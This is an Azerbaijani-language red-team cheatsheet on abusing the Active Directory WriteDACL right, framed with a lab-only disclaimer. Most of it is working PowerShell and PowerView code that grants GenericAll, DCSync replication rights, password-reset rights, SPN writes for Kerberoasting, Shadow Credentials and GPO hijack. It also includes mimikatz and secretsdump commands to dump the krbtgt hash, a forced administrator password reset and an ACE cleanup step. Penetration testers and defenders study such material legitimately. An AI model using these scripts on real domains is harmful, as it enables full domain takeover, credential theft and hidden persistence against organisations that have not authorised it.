# WriteDACL Cheatsheet — Active Directory

> **Xəbərdarlıq:** Bu sənəd yalnız təhlükəsizlik testləri, Red Team əməliyyatları və lab mühitləri üçündür.  
> İcazəsiz istifadə qanunsuz sayılır.

---

## WriteDACL nədir?

`WriteDACL` (`Write-Discretionary Access Control List`) — bir AD obyektinin **icazə siyahısını (DACL) dəyişdirmək** hüququdur.  
Bu hüquqa sahib olan istifadəçi hədəf obyektə **istənilən başqa hüququ əlavə edə bilər** — o cümlədən `GenericAll`, `WriteOwner`, `DCSync` hüquqları.

---

## Hüquqlar Hiyerarşiyası

```
WriteDACL
  └─► GenericAll əlavə et      → tam nəzarət
  └─► WriteOwner əlavə et      → sahibliyi al
  └─► DCSync hüquqları əlavə et → domain hash dump
  └─► Kerberoasting üçün SPN yaz
  └─► Shadow Credentials yaz
  └─► ACE kalıcılaşdır (backdoor)
```

---

## 1. Hədəf Obyektə GenericAll Vermək

```powershell
# jkimmich → administrator üzərində GenericAll
$sid = (Get-ADUser "jkimmich").SID
$identity = New-Object System.Security.Principal.SecurityIdentifier($sid)
$ntAccount = $identity.Translate([System.Security.Principal.NTAccount])

$target = [ADSI]"LDAP://CN=Administrator,CN=Users,DC=lab,DC=local"
$acl = $target.psbase.ObjectSecurity

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $ntAccount,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
)
$acl.AddAccessRule($ace)
$target.psbase.CommitChanges()
```

---

## 2. DCSync Hüququnu Vermək (Domain Compromise)

DCSync üçün 3 genişlənmiş hüquq tələb olunur:

| GUID | Hüquq |
|------|-------|
| `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes |
| `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes-All |
| `89e95b76-444d-4c62-991a-0facbeda640c` | DS-Replication-Get-Changes-In-Filtered-Set |

```powershell
$domain = [ADSI]"LDAP://DC=lab,DC=local"
$sid    = (Get-ADUser "jkimmich").SID
$ntAcct = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate(
              [System.Security.Principal.NTAccount])
$acl    = $domain.psbase.ObjectSecurity

$guids = @(
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
    "89e95b76-444d-4c62-991a-0facbeda640c"
)

foreach ($g in $guids) {
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $ntAcct,
        [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
        [System.Security.AccessControl.AccessControlType]::Allow,
        [Guid]$g,
        [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None,
        [Guid]::Empty
    )
    $acl.AddAccessRule($ace)
}
$domain.psbase.CommitChanges()

# Sonra mimikatz / impacket ilə:
# mimikatz # lsadump::dcsync /domain:lab.local /user:krbtgt
# secretsdump.py lab/jkimmich@dc01 -just-dc
```

---

## 3. Parol Sıfırlama (ForceChangePassword)

```powershell
$target  = [ADSI]"LDAP://CN=Administrator,CN=Users,DC=lab,DC=local"
$sid     = (Get-ADUser "jkimmich").SID
$ntAcct  = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate(
               [System.Security.Principal.NTAccount])
$acl     = $target.psbase.ObjectSecurity

$resetGuid = [Guid]"00299570-246d-11d0-a768-00aa006e0529"

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $ntAcct,
    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
    [System.Security.AccessControl.AccessControlType]::Allow,
    $resetGuid,
    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None,
    [Guid]::Empty
)
$acl.AddAccessRule($ace)
$target.psbase.CommitChanges()

# Hüquq verildikdən sonra parolu sıfırla:
net user administrator Passw0rd123! /domain
# və ya:
Set-ADAccountPassword -Identity administrator -Reset -NewPassword (ConvertTo-SecureString "Passw0rd123!" -AsPlainText -Force)
```

---

## 4. Kerberoasting üçün SPN Yazmaq

```powershell
# WriteSPN hüququnu ver
$target = [ADSI]"LDAP://CN=TargetUser,CN=Users,DC=lab,DC=local"
$sid    = (Get-ADUser "jkimmich").SID
$ntAcct = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate(
              [System.Security.Principal.NTAccount])
$acl    = $target.psbase.ObjectSecurity

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $ntAcct,
    [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [Guid]"f3a64788-5306-11d1-a9c5-0000f80367c1",  # servicePrincipalName attribute GUID
    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None,
    [Guid]::Empty
)
$acl.AddAccessRule($ace)
$target.psbase.CommitChanges()

# SPN əlavə et, sonra Kerberoast:
Set-ADUser TargetUser -ServicePrincipalNames @{Add="HTTP/fake.lab.local"}
# Rubeus.exe kerberoast /outfile:hashes.txt
```

---

## 5. Shadow Credentials (PKINIT Attack)

```powershell
# msDS-KeyCredentialLink yazma hüququ ver
$keyCredGuid = [Guid]"5b47d60f-6090-40b2-9f37-2a4de88f3063"

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $ntAcct,
    [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
    [System.Security.AccessControl.AccessControlType]::Allow,
    $keyCredGuid,
    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None,
    [Guid]::Empty
)
$acl.AddAccessRule($ace)
$target.psbase.CommitChanges()

# Whisker / pywhisker ilə istismar:
# Whisker.exe add /target:administrator
# pywhisker.py -d lab.local -u jkimmich -p 'Pass' --target administrator --action add
```

---

## 6. OU üzərində GenericAll Vermək (Bütün Uşaq Obyektlər)

```powershell
$ou     = [ADSI]"LDAP://OU=Finance,DC=lab,DC=local"
$sid    = (Get-ADUser "jkimmich").SID
$ntAcct = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate(
              [System.Security.Principal.NTAccount])
$acl    = $ou.psbase.ObjectSecurity

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $ntAcct,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents,
    [Guid]::Empty
)
$acl.AddAccessRule($ace)
$ou.psbase.CommitChanges()
```

---

## 7. GPO üzərində WriteDACL → GPO Hijack

```powershell
# GPO GUID-ini tap
Get-GPO -All | Select DisplayName, Id

# GPO-nun AD obyektinə WriteDACL ver
$gpoGuid = "{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}"
$gpo = [ADSI]"LDAP://CN=$gpoGuid,CN=Policies,CN=System,DC=lab,DC=local"

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $ntAcct,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
)
$gpo.psbase.ObjectSecurity.AddAccessRule($ace)
$gpo.psbase.CommitChanges()

# GPO məzmununu dəyiş (SYSVOL yazma hüququ lazımdır):
# SharpGPOAbuse.exe --AddComputerTask --TaskName "pwn" --Command "cmd.exe" --Arguments "/c ..."
```

---

## 8. Mövcud ACE-ləri Yoxlamaq

```powershell
# Hədəf obyektin DACL-ini göstər
$obj = [ADSI]"LDAP://CN=Administrator,CN=Users,DC=lab,DC=local"
$acl = $obj.psbase.ObjectSecurity
$acl.GetAccessRules($true, $true, [System.Security.Principal.NTAccount]) |
    Select IdentityReference, ActiveDirectoryRights, AccessControlType |
    Format-Table -AutoSize

# BloodHound ilə qrafik analiz:
# SharpHound.exe -c All
# Cypher: MATCH p=shortestPath((u:User)-[r:WriteDacl*1..]->(n)) RETURN p
```

---

## 9. Əlavə Edilmiş ACE-i Silmək (Cleanup)

```powershell
$target = [ADSI]"LDAP://CN=Administrator,CN=Users,DC=lab,DC=local"
$acl    = $target.psbase.ObjectSecurity

$sid    = (Get-ADUser "jkimmich").SID
$ntAcct = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate(
              [System.Security.Principal.NTAccount])

$rules = $acl.GetAccessRules($true, $false, [System.Security.Principal.NTAccount]) |
    Where-Object { $_.IdentityReference -eq $ntAcct }

foreach ($rule in $rules) {
    $acl.RemoveAccessRule($rule)
}
$target.psbase.CommitChanges()
Write-Host "ACE silindi."
```

---

## Hücum Vektoru Xülasəsi

| Hücum | Tələb olunan | Nəticə |
|-------|-------------|--------|
| GenericAll ver | WriteDACL | Tam nəzarət |
| DCSync hüquqları əlavə et | WriteDACL @ domain root | krbtgt hash dump |
| Parol sıfırla | WriteDACL + ExtendedRight | Hesabı ele keç |
| Kerberoasting | WriteDACL + WriteProperty | Offline hash crack |
| Shadow Credentials | WriteDACL + WriteProperty | Sertifikatla auth |
| GPO Hijack | WriteDACL @ GPO | Lateral movement / persistence |
| OU GenericAll | WriteDACL @ OU | Bütün uşaq obyektlər |

---

## Faydalı Alətlər

| Alət | İstifadə |
|------|----------|
| `BloodHound` | WriteDACL yollarını qrafik göstər |
| `SharpHound` | AD məlumat toplama |
| `PowerView` | `Add-DomainObjectAcl`, `Get-DomainObjectAcl` |
| `mimikatz` | DCSync sonrası hash dump |
| `impacket/secretsdump` | Remote DCSync |
| `Whisker / pywhisker` | Shadow Credentials |
| `Rubeus` | Kerberoasting, ticket işləmə |
| `SharpGPOAbuse` | GPO üzərindən kod icra |

---

## PowerView ilə Qısa Sintaksis

```powershell
# WriteDACL hüququ əlavə et (PowerView)
Add-DomainObjectAcl -TargetIdentity administrator `
                    -PrincipalIdentity jkimmich `
                    -Rights WriteDacl

# GenericAll əlavə et
Add-DomainObjectAcl -TargetIdentity administrator `
                    -PrincipalIdentity jkimmich `
                    -Rights All

# DCSync hüquqları əlavə et
Add-DomainObjectAcl -TargetIdentity "DC=lab,DC=local" `
                    -PrincipalIdentity jkimmich `
                    -Rights DCSync

# Mövcud ACL-ları yoxla
Get-DomainObjectAcl -Identity administrator -ResolveGUIDs |
    Where-Object { $_.SecurityIdentifier -match (Get-ADUser jkimmich).SID }
```

---

*Hazırlandı: AD Security Cheatsheet — WriteDACL Attack Paths*
